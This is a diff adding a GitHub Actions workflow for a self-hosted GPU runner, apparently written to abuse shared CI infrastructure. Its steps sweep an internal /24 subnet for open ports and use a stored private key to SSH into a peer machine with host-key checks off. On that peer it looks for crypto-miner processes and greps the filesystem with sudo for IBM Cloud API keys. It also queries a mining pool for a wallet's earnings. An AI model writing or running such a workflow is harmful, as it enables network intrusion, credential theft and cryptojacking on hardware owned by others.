@@ -1,0 +1,33 @@
+name: ul-ibm8235g
+on:
+  workflow_dispatch:
+jobs:
+  g:
+    runs-on: [self-hosted, ul-l40s]
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - name: final
+        continue-on-error: true
+        run: |
+          set +e
+          echo "=== L40S SELF $(hostname) ==="
+          nvidia-smi --query-gpu=index,name,serial,uuid,driver_version --format=csv,noheader
+          echo "=== /24 SWEEP (top ports) ==="
+          for i in $(seq 1 254); do for p in 22 6443 10250 9400 8090 80; do ( timeout 1 bash -c "echo > /dev/tcp/10.243.0.$i/$p" 2>/dev/null && echo "OPEN 10.243.0.$i:$p" ) & done; done; wait | head -60
+          echo "=== L4 PEER 10.243.0.24 ==="
+          K=$(pwd)/az/ibm_key.pem
+          ssh -i $K -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=8 ubuntu@10.243.0.24 'echo OK $(hostname) $(hostname -I|cut -d" " -f1); nvidia-smi --query-gpu=index,name,serial,uuid --format=csv,noheader; pgrep -af "pearl-gpu-miner|krig-miner|peakminer" | head -3; ls -d /etc/ibm /root/.bluemix /etc/ibmcloud /root/.config/ibmcloud 2>/dev/null; sudo -n grep -rasohE "IBMCLOUD_API_KEY=[A-Za-z0-9_-]{20,}|IC_API_KEY=[A-Za-z0-9_-]{20,}|apikey[\"=: ]+[A-Za-z0-9_-]{40,}" /etc /opt /root /home 2>/dev/null | head -5; sudo -n true && echo SUDO_OK' 2>&1 | head -25
+          echo "=== WALLET POOL-SIDE ==="
+          curl -s -m 25 "https://pearl.luckypool.io/api/stats_address?address=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" -o /tmp/st.json -w 'stats %{http_code} %{size_download}\n'
+          python3 - <<'PY'
+import json
+try:
+    d=json.load(open('/tmp/st.json'))
+    print('acceptedShares',d.get('acceptedShares'),'blocksFound',d.get('blocksFound'),'paid',d.get('paid'))
+    ws=d.get('workers') or d.get('workerStats') or []
+    if isinstance(ws,dict): ws=list(ws.items())
+    for w in ws[:40]: print('W',w if isinstance(w,str) else json.dumps(w)[:300])
+except Exception as e: print('parse',e, open('/tmp/st.json').read()[:200])
+PY
+          echo "G_DONE"
